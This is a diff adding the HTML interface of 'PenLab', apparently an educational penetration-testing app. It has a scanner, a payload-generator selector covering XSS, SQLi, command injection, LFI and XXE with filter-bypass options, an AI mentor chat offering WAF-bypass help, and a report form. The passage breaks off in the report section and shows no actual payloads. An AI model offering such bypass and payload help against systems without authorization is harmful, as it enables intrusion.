@@ -1,0 +1,1516 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PenLab — Penetration Testing Platform</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #080c10;
+  --bg2: #0d1117;
+  --bg3: #111820;
+  --panel: #0e1520;
+  --border: #1a2535;
+  --border2: #1f2e42;
+  --green: #00ff88;
+  --green2: #00cc6a;
+  --green-dim: rgba(0,255,136,0.08);
+  --green-glow: rgba(0,255,136,0.15);
+  --red: #ff4455;
+  --red-dim: rgba(255,68,85,0.1);
+  --yellow: #ffd000;
+  --yellow-dim: rgba(255,208,0,0.08);
+  --blue: #00aaff;
+  --blue-dim: rgba(0,170,255,0.08);
+  --text: #c8d8e8;
+  --text2: #7a9ab8;
+  --text3: #3a5068;
+  --mono: 'Share Tech Mono', monospace;
+  --head: 'Rajdhani', sans-serif;
+  --body: 'Inter', sans-serif;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--body);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* Grid background */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background-image:
+    linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+  background-size: 40px 40px;
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* ── TOPBAR ── */
+.topbar {
+  position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+  background: rgba(8,12,16,0.95);
+  border-bottom: 1px solid var(--border);
+  backdrop-filter: blur(12px);
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 0 32px; height: 56px;
+}
+.topbar-brand {
+  display: flex; align-items: center; gap: 12px;
+}
+.brand-icon {
+  width: 32px; height: 32px;
+  border: 1px solid var(--green);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 14px;
+  box-shadow: 0 0 10px var(--green-glow);
+  position: relative;
+}
+.brand-icon::before {
+  content: '';
+  position: absolute; inset: 3px;
+  border: 1px solid rgba(0,255,136,0.2);
+}
+.brand-name {
+  font-family: var(--head);
+  font-size: 20px; font-weight: 700;
+  letter-spacing: 3px;
+  color: var(--green);
+  text-shadow: 0 0 20px var(--green-glow);
+}
+.brand-version {
+  font-family: var(--mono);
+  font-size: 10px; color: var(--text3);
+  letter-spacing: 1px;
+}
+.topbar-status {
+  display: flex; align-items: center; gap: 20px;
+  font-family: var(--mono); font-size: 11px; color: var(--text3);
+}
+.status-dot {
+  width: 6px; height: 6px; border-radius: 50%;
+  background: var(--green);
+  box-shadow: 0 0 8px var(--green);
+  animation: pulse 2s infinite;
+}
+@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
+
+/* ── NAV ── */
+.nav {
+  position: fixed; top: 56px; left: 0; bottom: 0; width: 220px; z-index: 90;
+  background: var(--bg2);
+  border-right: 1px solid var(--border);
+  padding: 24px 0;
+  display: flex; flex-direction: column; gap: 4px;
+}
+.nav-section {
+  font-family: var(--mono); font-size: 9px; letter-spacing: 2px;
+  color: var(--text3); padding: 16px 20px 6px;
+  text-transform: uppercase;
+}
+.nav-item {
+  display: flex; align-items: center; gap: 12px;
+  padding: 10px 20px; cursor: pointer;
+  font-family: var(--head); font-size: 14px; font-weight: 500;
+  color: var(--text2); letter-spacing: 1px;
+  border-left: 2px solid transparent;
+  transition: all 0.15s;
+  position: relative;
+}
+.nav-item:hover { color: var(--text); background: rgba(255,255,255,0.02); }
+.nav-item.active {
+  color: var(--green);
+  border-left-color: var(--green);
+  background: var(--green-dim);
+}
+.nav-item.active::after {
+  content: '';
+  position: absolute; right: 0; top: 0; bottom: 0;
+  width: 1px; background: var(--green);
+  box-shadow: 0 0 8px var(--green);
+}
+.nav-icon { font-size: 16px; width: 20px; text-align: center; }
+.nav-badge {
+  margin-left: auto; font-family: var(--mono); font-size: 9px;
+  padding: 2px 6px; background: var(--green-dim);
+  border: 1px solid rgba(0,255,136,0.2); color: var(--green);
+}
+
+/* ── MAIN ── */
+.main {
+  margin-left: 220px;
+  padding-top: 56px;
+  min-height: 100vh;
+  position: relative; z-index: 1;
+}
+.page { display: none; padding: 32px; }
+.page.active { display: block; }
+
+/* ── PAGE HEADER ── */
+.page-header { margin-bottom: 28px; }
+.page-eyebrow {
+  font-family: var(--mono); font-size: 10px; letter-spacing: 3px;
+  color: var(--green); text-transform: uppercase; margin-bottom: 6px;
+}
+.page-title {
+  font-family: var(--head); font-size: 32px; font-weight: 700;
+  color: white; letter-spacing: 2px; line-height: 1;
+}
+.page-sub { font-size: 13px; color: var(--text2); margin-top: 6px; line-height: 1.5; }
+
+/* ── PANELS ── */
+.panel {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  margin-bottom: 16px;
+}
+.panel-header {
+  padding: 14px 20px;
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; justify-content: space-between;
+  gap: 12px;
+}
+.panel-title {
+  font-family: var(--head); font-size: 13px; font-weight: 600;
+  letter-spacing: 2px; text-transform: uppercase; color: var(--text);
+  display: flex; align-items: center; gap: 8px;
+}
+.panel-body { padding: 20px; }
+
+/* ── GRID ── */
+.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+.grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }
+
+/* ── INPUTS ── */
+.input-group { margin-bottom: 16px; }
+.input-label {
+  font-family: var(--mono); font-size: 10px; letter-spacing: 1.5px;
+  text-transform: uppercase; color: var(--text2); margin-bottom: 6px;
+  display: flex; justify-content: space-between;
+}
+.input-field {
+  width: 100%; background: var(--bg3);
+  border: 1px solid var(--border2); color: var(--text);
+  font-family: var(--mono); font-size: 13px;
+  padding: 10px 14px; outline: none;
+  transition: border-color .15s, box-shadow .15s;
+}
+.input-field:focus {
+  border-color: var(--green);
+  box-shadow: 0 0 0 2px var(--green-dim);
+}
+.input-field::placeholder { color: var(--text3); }
+select.input-field { cursor: pointer; }
+select.input-field option { background: var(--bg2); }
+
+/* ── BUTTONS ── */
+.btn {
+  padding: 10px 20px; border: none; cursor: pointer;
+  font-family: var(--head); font-size: 13px; font-weight: 600;
+  letter-spacing: 2px; text-transform: uppercase;
+  transition: all .15s; display: inline-flex; align-items: center; gap: 8px;
+}
+.btn-primary {
+  background: var(--green); color: var(--bg);
+  box-shadow: 0 0 20px var(--green-glow);
+}
+.btn-primary:hover {
+  background: #00ffaa;
+  box-shadow: 0 0 30px rgba(0,255,136,0.3);
+}
+.btn-primary:disabled { background: var(--border2); color: var(--text3); box-shadow: none; cursor: not-allowed; }
+.btn-ghost {
+  background: transparent; color: var(--text2);
+  border: 1px solid var(--border2);
+}
+.btn-ghost:hover { border-color: var(--green); color: var(--green); }
+.btn-danger {
+  background: transparent; color: var(--red);
+  border: 1px solid rgba(255,68,85,0.3);
+}
+.btn-danger:hover { background: var(--red-dim); }
+.btn-sm { padding: 6px 12px; font-size: 11px; }
+.btn-full { width: 100%; justify-content: center; }
+
+/* ── TERMINAL ── */
+.terminal {
+  background: #040810;
+  border: 1px solid var(--border);
+  padding: 16px;
+  font-family: var(--mono); font-size: 12px;
+  min-height: 120px; max-height: 320px;
+  overflow-y: auto; line-height: 1.8;
+}
+.terminal::-webkit-scrollbar { width: 4px; }
+.terminal::-webkit-scrollbar-track { background: transparent; }
+.terminal::-webkit-scrollbar-thumb { background: var(--border2); }
+.t-green { color: var(--green); }
+.t-red { color: var(--red); }
+.t-yellow { color: var(--yellow); }
+.t-blue { color: var(--blue); }
+.t-dim { color: var(--text3); }
+.t-white { color: white; }
+
+/* ── BADGES ── */
+.badge {
+  font-family: var(--mono); font-size: 10px; letter-spacing: 1px;
+  padding: 2px 8px; text-transform: uppercase;
+}
+.badge-critical { background: rgba(255,68,85,0.15); border: 1px solid rgba(255,68,85,0.4); color: var(--red); }
+.badge-high { background: rgba(255,120,0,0.12); border: 1px solid rgba(255,120,0,0.3); color: #ff7800; }
+.badge-medium { background: var(--yellow-dim); border: 1px solid rgba(255,208,0,0.3); color: var(--yellow); }
+.badge-low { background: var(--blue-dim); border: 1px solid rgba(0,170,255,0.3); color: var(--blue); }
+.badge-info { background: rgba(100,100,100,0.1); border: 1px solid var(--border2); color: var(--text2); }
+.badge-ok { background: var(--green-dim); border: 1px solid rgba(0,255,136,0.3); color: var(--green); }
+
+/* ── FINDING CARD ── */
+.finding {
+  border: 1px solid var(--border);
+  margin-bottom: 10px;
+  transition: border-color .15s;
+}
+.finding:hover { border-color: var(--border2); }
+.finding-header {
+  padding: 12px 16px;
+  display: flex; align-items: center; gap: 12px; cursor: pointer;
+  background: rgba(255,255,255,0.01);
+}
+.finding-title { font-family: var(--head); font-size: 13px; font-weight: 600; flex: 1; }
+.finding-body { padding: 16px; border-top: 1px solid var(--border); display: none; }
+.finding.open .finding-body { display: block; }
+.finding-desc { font-size: 12px; color: var(--text2); line-height: 1.7; margin-bottom: 12px; }
+.finding-detail { font-size: 11px; line-height: 1.6; }
+.finding-detail strong { color: var(--text); display: block; font-family: var(--mono); font-size: 10px; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 4px; margin-top: 10px; color: var(--text2); }
+.finding-detail code { background: var(--bg3); padding: 2px 6px; font-family: var(--mono); font-size: 11px; color: var(--yellow); }
+
+/* ── PAYLOAD CARD ── */
+.payload-card {
+  background: var(--bg3); border: 1px solid var(--border);
+  margin-bottom: 8px; transition: border-color .15s;
+}
+.payload-card:hover { border-color: var(--green); }
+.payload-header {
+  padding: 10px 14px; display: flex; align-items: center; gap: 10px;
+  cursor: pointer;
+}
+.payload-title { font-family: var(--head); font-size: 12px; font-weight: 600; letter-spacing: 1px; flex: 1; }
+.payload-body { padding: 0 14px 14px; display: none; }
+.payload-card.open .payload-body { display: block; }
+.payload-code {
+  background: #040810; border: 1px solid var(--border);
+  padding: 12px; font-family: var(--mono); font-size: 11px;
+  color: var(--green); line-height: 1.6; word-break: break-all;
+  position: relative; margin: 8px 0;
+}
+.payload-copy {
+  position: absolute; top: 6px; right: 6px;
+  background: var(--border2); border: none; color: var(--text2);
+  font-family: var(--mono); font-size: 9px; padding: 3px 8px;
+  cursor: pointer; letter-spacing: 1px;
+}
+.payload-copy:hover { color: var(--green); }
+.payload-explain { font-size: 11px; color: var(--text2); line-height: 1.7; }
+.payload-warn {
+  font-size: 10px; color: var(--yellow); margin-top: 8px;
+  padding: 6px 10px; background: var(--yellow-dim);
+  border-left: 2px solid var(--yellow);
+  font-family: var(--mono);
+}
+
+/* ── LEARN CHAT ── */
+.chat-window {
+  background: #040810; border: 1px solid var(--border);
+  height: 420px; overflow-y: auto; padding: 20px;
+  display: flex; flex-direction: column; gap: 14px;
+}
+.chat-window::-webkit-scrollbar { width: 4px; }
+.chat-window::-webkit-scrollbar-thumb { background: var(--border2); }
+.chat-msg { display: flex; gap: 10px; max-width: 88%; }
+.chat-msg.user { align-self: flex-end; flex-direction: row-reverse; }
+.chat-avatar {
+  width: 28px; height: 28px; flex-shrink: 0;
+  border: 1px solid var(--border2);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 11px; font-family: var(--mono);
+  align-self: flex-start;
+}
+.chat-msg.user .chat-avatar { background: var(--green-dim); border-color: rgba(0,255,136,0.3); color: var(--green); }
+.chat-msg.ai .chat-avatar { background: var(--blue-dim); border-color: rgba(0,170,255,0.2); color: var(--blue); }
+.chat-bubble {
+  padding: 12px 14px; font-size: 12px; line-height: 1.75;
+  border: 1px solid var(--border);
+}
+.chat-msg.user .chat-bubble { background: var(--green-dim); border-color: rgba(0,255,136,0.15); color: var(--text); }
+.chat-msg.ai .chat-bubble { background: var(--panel); color: var(--text2); }
+.chat-bubble code { font-family: var(--mono); background: var(--bg3); padding: 1px 5px; color: var(--yellow); font-size: 11px; }
+.chat-bubble strong { color: var(--text); }
+.chat-input-row { display: flex; gap: 8px; margin-top: 12px; }
+.chat-typing {
+  display: flex; align-items: center; gap: 6px;
+  padding: 12px 14px; border: 1px solid var(--border);
+  background: var(--panel); align-self: flex-start;
+}
+.typing-dot {
+  width: 5px; height: 5px; border-radius: 50%;
+  background: var(--blue);
+  animation: typing 1.2s infinite;
+}
+.typing-dot:nth-child(2) { animation-delay: 0.2s; }
+.typing-dot:nth-child(3) { animation-delay: 0.4s; }
+@keyframes typing { 0%,60%,100%{transform:translateY(0);opacity:.4;} 30%{transform:translateY(-4px);opacity:1;} }
+
+/* ── REPORT ── */
+.report-section { margin-bottom: 20px; }
+.report-section-title {
+  font-family: var(--head); font-size: 12px; font-weight: 600;
+  letter-spacing: 2px; text-transform: uppercase;
+  color: var(--text2); margin-bottom: 10px;
+  padding-bottom: 6px; border-bottom: 1px solid var(--border);
+}
+.finding-item {
+  display: flex; align-items: center; gap: 12px;
+  padding: 10px 14px; border: 1px solid var(--border);
+  margin-bottom: 6px; background: var(--bg3);
+}
+.finding-item-title { flex: 1; font-size: 12px; }
+.finding-item-actions { display: flex; gap: 6px; }
+
+/* ── STAT CARDS ── */
+.stat-card {
+  background: var(--panel); border: 1px solid var(--border);
+  padding: 20px; text-align: center;
+}
+.stat-num {
+  font-family: var(--head); font-size: 36px; font-weight: 700;
+  line-height: 1;
+}
+.stat-num.green { color: var(--green); text-shadow: 0 0 20px var(--green-glow); }
+.stat-num.red { color: var(--red); }
+.stat-num.yellow { color: var(--yellow); }
+.stat-num.blue { color: var(--blue); }
+.stat-label {
+  font-family: var(--mono); font-size: 10px; letter-spacing: 1.5px;
+  text-transform: uppercase; color: var(--text3); margin-top: 6px;
+}
+
+/* ── LEARN TOPICS ── */
+.topic-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 10px; margin-bottom: 16px; }
+.topic-btn {
+  padding: 12px; background: var(--bg3); border: 1px solid var(--border);
+  cursor: pointer; text-align: left; transition: all .15s;
+  font-family: var(--head); color: var(--text2);
+}
+.topic-btn:hover { border-color: var(--green); color: var(--green); background: var(--green-dim); }
+.topic-icon { font-size: 18px; margin-bottom: 4px; }
+.topic-name { font-size: 12px; font-weight: 600; letter-spacing: 1px; }
+.topic-desc { font-size: 10px; color: var(--text3); margin-top: 2px; font-family: var(--body); }
+
+/* ── PROGRESS BAR ── */
+.progress-bar { height: 3px; background: var(--border); overflow: hidden; }
+.progress-fill { height: 100%; background: var(--green); transition: width .3s; box-shadow: 0 0 6px var(--green); }
+
+/* ── SCAN PROGRESS ── */
+.scan-step {
+  display: flex; align-items: center; gap: 12px;
+  padding: 8px 0; border-bottom: 1px solid var(--border);
+  font-family: var(--mono); font-size: 11px;
+}
+.scan-step:last-child { border-bottom: none; }
+.step-icon { width: 20px; text-align: center; }
+.step-text { flex: 1; color: var(--text2); }
+.step-status { font-size: 10px; }
+
+/* ── DIVIDER ── */
+.divider { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
+
+/* ── TOAST ── */
+.toast {
+  position: fixed; bottom: 24px; right: 24px;
+  background: var(--panel); border: 1px solid var(--border);
+  padding: 12px 18px; font-family: var(--mono); font-size: 11px;
+  z-index: 999; transform: translateY(80px); opacity: 0;
+  transition: all .25s; border-left: 3px solid var(--green);
+}
+.toast.show { transform: translateY(0); opacity: 1; }
+.toast.err { border-left-color: var(--red); }
+
+/* ── MOBILE ── */
+@media(max-width:768px) {
+  .nav { display: none; }
+  .main { margin-left: 0; }
+  .grid-2,.grid-3 { grid-template-columns: 1fr; }
+  .topic-grid { grid-template-columns: 1fr 1fr; }
+  .page { padding: 16px; }
+}
+</style>
+</head>
+<body>
+
+<!-- TOPBAR -->
+<div class="topbar">
+  <div class="topbar-brand">
+    <div class="brand-icon">⬡</div>
+    <div>
+      <div class="brand-name">PENLAB</div>
+    </div>
+    <div class="brand-version">v1.0 // EDUCATIONAL</div>
+  </div>
+  <div class="topbar-status">
+    <div class="status-dot"></div>
+    <span>SYSTEM ONLINE</span>
+    <span style="color:var(--border2)">|</span>
+    <span id="clockDisplay"></span>
+  </div>
+</div>
+
+<!-- NAV -->
+<nav class="nav">
+  <div class="nav-section">Modules</div>
+  <div class="nav-item active" id="nav-dashboard" onclick="showPage('dashboard')">
+    <span class="nav-icon">⊞</span> Dashboard
+  </div>
+  <div class="nav-item" id="nav-scanner" onclick="showPage('scanner')">
+    <span class="nav-icon">⬡</span> Scanner
+  </div>
+  <div class="nav-item" id="nav-payloads" onclick="showPage('payloads')">
+    <span class="nav-icon">◈</span> Payloads
+  </div>
+  <div class="nav-item" id="nav-learn" onclick="showPage('learn')">
+    <span class="nav-icon">◎</span> Learn
+    <span class="nav-badge">AI</span>
+  </div>
+  <div class="nav-item" id="nav-report" onclick="showPage('report')">
+    <span class="nav-icon">▤</span> Report
+  </div>
+  <div class="nav-section" style="margin-top:auto">Info</div>
+  <div class="nav-item" style="font-size:11px;color:var(--text3);cursor:default;border-left:none">
+    <span class="nav-icon">⚠</span> For authorized testing only
+  </div>
+</nav>
+
+<!-- MAIN -->
+<main class="main">
+
+<!-- ═══ DASHBOARD ═══ -->
+<div class="page active" id="page-dashboard">
+  <div class="page-header">
+    <div class="page-eyebrow">// overview</div>
+    <div class="page-title">DASHBOARD</div>
+    <div class="page-sub">Entry-level penetration testing toolkit — web & network analysis, payload generation, AI-guided learning.</div>
+  </div>
+
+  <div class="grid-3" style="margin-bottom:16px">
+    <div class="stat-card">
+      <div class="stat-num red" id="statFindings">0</div>
+      <div class="stat-label">Findings</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num yellow" id="statScans">0</div>
+      <div class="stat-label">Scans Run</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num green" id="statPayloads">0</div>
+      <div class="stat-label">Payloads Generated</div>
+    </div>
+  </div>
+
+  <div class="grid-2">
+    <div class="panel">
+      <div class="panel-header">
+        <div class="panel-title">⬡ Quick Scan</div>
+      </div>
+      <div class="panel-body">
+        <div class="input-group">
+          <div class="input-label">Target URL</div>
+          <input class="input-field" id="dashTarget" placeholder="https://example.com" type="url">
+        </div>
+        <button class="btn btn-primary btn-full" onclick="showPage('scanner');document.getElementById('scanTarget').value=document.getElementById('dashTarget').value">
+          ⬡ Launch Scanner
+        </button>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="panel-header">
+        <div class="panel-title">◎ Recent Activity</div>
+      </div>
+      <div class="panel-body">
+        <div class="terminal" id="activityLog" style="min-height:80px">
+          <span class="t-green">$</span> <span class="t-dim">penlab initialized</span><br>
+          <span class="t-green">$</span> <span class="t-dim">all modules loaded</span><br>
+          <span class="t-green">$</span> <span class="t-dim">awaiting target...</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="grid-3" style="margin-top:16px">
+    <div class="panel" style="cursor:pointer" onclick="showPage('scanner')">
+      <div class="panel-body" style="text-align:center;padding:24px">
+        <div style="font-size:32px;margin-bottom:10px">⬡</div>
+        <div style="font-family:var(--head);font-size:15px;font-weight:700;letter-spacing:2px;color:var(--green);margin-bottom:6px">SCANNER</div>
+        <div style="font-size:11px;color:var(--text2);line-height:1.6">Analyze headers, cookies, HTTPS config, common misconfigurations</div>
+      </div>
+    </div>
+    <div class="panel" style="cursor:pointer" onclick="showPage('payloads')">
+      <div class="panel-body" style="text-align:center;padding:24px">
+        <div style="font-size:32px;margin-bottom:10px">◈</div>
+        <div style="font-family:var(--head);font-size:15px;font-weight:700;letter-spacing:2px;color:var(--yellow);margin-bottom:6px">PAYLOADS</div>
+        <div style="font-size:11px;color:var(--text2);line-height:1.6">XSS, SQLi, CSRF, Command Injection payloads with explanations</div>
+      </div>
+    </div>
+    <div class="panel" style="cursor:pointer" onclick="showPage('learn')">
+      <div class="panel-body" style="text-align:center;padding:24px">
+        <div style="font-size:32px;margin-bottom:10px">◎</div>
+        <div style="font-family:var(--head);font-size:15px;font-weight:700;letter-spacing:2px;color:var(--blue);margin-bottom:6px">LEARN</div>
+        <div style="font-size:11px;color:var(--text2);line-height:1.6">AI mentor — ask anything about pentesting concepts</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="panel" style="margin-top:16px;border-color:rgba(255,208,0,0.2)">
+    <div class="panel-body" style="display:flex;gap:16px;align-items:center">
+      <div style="font-size:24px">⚠</div>
+      <div>
+        <div style="font-family:var(--head);font-size:13px;font-weight:700;letter-spacing:2px;color:var(--yellow);margin-bottom:4px">LEGAL DISCLAIMER</div>
+        <div style="font-size:11px;color:var(--text2);line-height:1.7">This tool is for <strong style="color:var(--text)">authorized penetration testing and educational purposes only</strong>. Only test systems you own or have explicit written permission to test. Unauthorized testing is illegal. PenLab does not store any data or transmit requests to third parties.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SCANNER ═══ -->
+<div class="page" id="page-scanner">
+  <div class="page-header">
+    <div class="page-eyebrow">// module_01</div>
+    <div class="page-title">VULNERABILITY SCANNER</div>
+    <div class="page-sub">Passive analysis of HTTP headers, security configuration, and common web misconfigurations.</div>
+  </div>
+
+  <div class="grid-2">
+    <div>
+      <div class="panel">
+        <div class="panel-header"><div class="panel-title">⬡ Target Configuration</div></div>
+        <div class="panel-body">
+          <div class="input-group">
+            <div class="input-label">Target URL <span style="color:var(--text3)">// must include https://</span></div>
+            <input class="input-field" id="scanTarget" placeholder="https://example.com" type="url">
+          </div>
+          <div class="input-group">
+            <div class="input-label">Scan Profile</div>
+            <select class="input-field" id="scanProfile">
+              <option value="passive">Passive — Headers & Config Only (Safe)</option>
+              <option value="active">Active — Include Endpoint Probing</option>
+            </select>
+          </div>
+          <div class="progress-bar" style="margin-bottom:12px"><div class="progress-fill" id="scanProgress" style="width:0%"></div></div>
+          <button class="btn btn-primary btn-full" id="scanBtn" onclick="runScan()">⬡ Start Scan</button>
+        </div>
+      </div>
+
+      <div class="panel" style="margin-top:0">
+        <div class="panel-header"><div class="panel-title">▸ Scan Log</div></div>
+        <div class="terminal" id="scanLog">
+          <span class="t-dim">// awaiting target</span>
+        </div>
+      </div>
+    </div>
+
+    <div>
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">◈ Findings</div>
+          <div id="findingCount" style="font-family:var(--mono);font-size:11px;color:var(--text3)">0 issues</div>
+        </div>
+        <div class="panel-body" id="findingsContainer">
+          <div style="text-align:center;padding:32px;color:var(--text3);font-family:var(--mono);font-size:11px">
+            // run a scan to see findings
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ PAYLOADS ═══ -->
+<div class="page" id="page-payloads">
+  <div class="page-header">
+    <div class="page-eyebrow">// module_02</div>
+    <div class="page-title">PAYLOAD GENERATOR</div>
+    <div class="page-sub">Reference payloads for common vulnerability classes. Each includes explanation and context.</div>
+  </div>
+
+  <div class="grid-2">
+    <div>
+      <div class="panel">
+        <div class="panel-header"><div class="panel-title">◈ Category</div></div>
+        <div class="panel-body">
+          <div class="input-group">
+            <div class="input-label">Vulnerability Type</div>
+            <select class="input-field" id="payloadCategory" onchange="renderPayloads()">
+              <option value="xss">Cross-Site Scripting (XSS)</option>
+              <option value="sqli">SQL Injection (SQLi)</option>
+              <option value="csrf">Cross-Site Request Forgery (CSRF)</option>
+              <option value="cmdi">Command Injection</option>
+              <option value="lfi">Local File Inclusion (LFI)</option>
+              <option value="xxe">XML External Entity (XXE)</option>
+            </select>
+          </div>
+          <div class="input-group">
+            <div class="input-label">Context</div>
+            <select class="input-field" id="payloadContext" onchange="renderPayloads()">
+              <option value="all">All Contexts</option>
+              <option value="basic">Basic / Beginner</option>
+              <option value="filter">Filter Bypass</option>
+              <option value="blind">Blind / OOB</option>
+            </select>
+          </div>
+          <button class="btn btn-primary btn-full" onclick="renderPayloads();incrementStat('statPayloads')">◈ Generate Payloads</button>
+        </div>
+      </div>
+      <div class="panel" style="margin-top:0">
+        <div class="panel-header"><div class="panel-title">◎ What is this?</div></div>
+        <div class="panel-body" id="vulnExplainer">
+          <div style="font-size:12px;color:var(--text2);line-height:1.8" id="vulnDesc"></div>
+        </div>
+      </div>
+    </div>
+
+    <div>
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">▸ Payload List</div>
+          <button class="btn btn-ghost btn-sm" onclick="addAllToReport()">+ Add All to Report</button>
+        </div>
+        <div class="panel-body" id="payloadList" style="max-height:600px;overflow-y:auto">
+          <div style="text-align:center;padding:32px;color:var(--text3);font-family:var(--mono);font-size:11px">
+            // select a category and generate
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ LEARN ═══ -->
+<div class="page" id="page-learn">
+  <div class="page-header">
+    <div class="page-eyebrow">// module_03 // powered by claude</div>
+    <div class="page-title">LEARN MODE</div>
+    <div class="page-sub">AI-powered mentor. Ask anything about pentesting — concepts, techniques, tools, methodology.</div>
+  </div>
+
+  <div class="grid-2">
+    <div>
+      <div class="panel">
+        <div class="panel-header"><div class="panel-title">◎ Quick Topics</div></div>
+        <div class="panel-body">
+          <div class="topic-grid">
+            <button class="topic-btn" onclick="askTopic('What is XSS and how does it work?')">
+              <div class="topic-icon">💉</div>
+              <div class="topic-name">XSS</div>
+              <div class="topic-desc">Cross-site scripting</div>
+            </button>
+            <button class="topic-btn" onclick="askTopic('Explain SQL injection with a beginner example')">
+              <div class="topic-icon">🗄️</div>
+              <div class="topic-name">SQLi</div>
+              <div class="topic-desc">Database attacks</div>
+            </button>
+            <button class="topic-btn" onclick="askTopic('What is a penetration test and what are the phases?')">
+              <div class="topic-icon">🗺️</div>
+              <div class="topic-name">Methodology</div>
+              <div class="topic-desc">Pentest phases</div>
+            </button>
+            <button class="topic-btn" onclick="askTopic('What is OWASP Top 10 and why does it matter?')">
+              <div class="topic-icon">📋</div>
+              <div class="topic-name">OWASP Top 10</div>
+              <div class="topic-desc">Top vulnerabilities</div>
+            </button>
+            <button class="topic-btn" onclick="askTopic('How does CSRF work and how is it prevented?')">
+              <div class="topic-icon">🔄</div>
+              <div class="topic-name">CSRF</div>
+              <div class="topic-desc">Request forgery</div>
+            </button>
+            <button class="topic-btn" onclick="askTopic('What tools do professional penetration testers use?')">
+              <div class="topic-icon">🛠️</div>
+              <div class="topic-name">Tools</div>
+              <div class="topic-desc">Pro toolkit</div>
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div>
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">◎ AI Mentor</div>
+          <div style="font-family:var(--mono);font-size:10px;color:var(--blue)">CLAUDE</div>
+        </div>
+        <div class="panel-body" style="padding:0">
+          <div class="chat-window" id="chatWindow">
+            <div class="chat-msg ai">
+              <div class="chat-avatar">AI</div>
+              <div class="chat-bubble">
+                <strong>Welcome to PenLab Learn Mode.</strong><br><br>
+                I'm your AI pentesting mentor. Ask me anything — from beginner questions like <code>what is XSS?</code> to more advanced topics like <code>how do I bypass WAF filters?</code><br><br>
+                Pick a topic on the left or type your own question below.
+              </div>
+            </div>
+          </div>
+          <div class="chat-input-row" style="padding:12px">
+            <input class="input-field" id="chatInput" placeholder="Ask anything about pentesting…" onkeydown="if(event.key==='Enter')sendChat()" style="flex:1">
+            <button class="btn btn-primary" onclick="sendChat()" id="chatSendBtn">▶ Ask</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ REPORT ═══ -->
+<div class="page" id="page-report">
+  <div class="page-header">
+    <div class="page-eyebrow">// module_04</div>
+    <div class="page-title">REPORT GENERATOR</div>
+    <div class="page-sub">Compile your findings into a professional penetration test report.</div>
+  </div>
+
+  <div class="grid-2">
+    <div>
+      <div class="panel">
+        <div class="panel-header"><div class="panel-title">▤ Engagement Details</div></div>
+        <div class="panel-body">
+          <div class="input-group">
+            <div class="input-label">Tester Name</div>
+            <input class="input-field" id="rptTester" placeholder="Your name">
+          </div>
+          <div class="input-group">
+            <div class="input-label">Target / Client</div>
+            <input class="input-field" id="rptTarget" placeholder="Target organization or URL">
+          </div>
+          <div class="input-group">
+            <div class="input-label">Scope</div>
+            <input class="input-field" id="rptScope" placeholder="e.g. https://example.com">
+          </div>
+          <div class="input-group">
+            <div class="input-label">Date</div>
+            <input class="input-field" id="rptDate" type="date">
+          </div>
+          <div class="input-group">
+            <div class="input-label">Executive Summary</div>
+            <textarea class="input-field" id="rptSummary" rows="4" placeholder="Brief summary of findings and overall risk posture…" style="resize:vertical"></textarea>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div>
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">◈ Findings List</div>
+          <button class="btn btn-ghost btn-sm" onclick="addManualFinding()">+ Add Finding</button>
+        </div>
+        <div class="panel-body" id="reportFindings">
+          <div style="text-align:center;padding:24px;color:var(--text3);font-family:var(--mono);font-size:11px">
+            // no findings yet — run scanner or add manually
+          </div>
+        </div>
+      </div>
+
+      <div class="panel" style="margin-top:0">
+        <div class="panel-header"><div class="panel-title">▸ Risk Summary</div></div>
+        <div class="panel-body">
+          <div class="grid-3" style="gap:8px">
+            <div style="text-align:center;padding:12px;background:var(--red-dim);border:1px solid rgba(255,68,85,0.2)">
+              <div style="font-family:var(--head);font-size:24px;font-weight:700;color:var(--red)" id="rptCritical">0</div>
+              <div style="font-family:var(--mono);font-size:9px;color:var(--text3);margin-top:4px">CRITICAL</div>
+            </div>
+            <div style="text-align:center;padding:12px;background:rgba(255,120,0,0.08);border:1px solid rgba(255,120,0,0.2)">
+              <div style="font-family:var(--head);font-size:24px;font-weight:700;color:#ff7800" id="rptHigh">0</div>
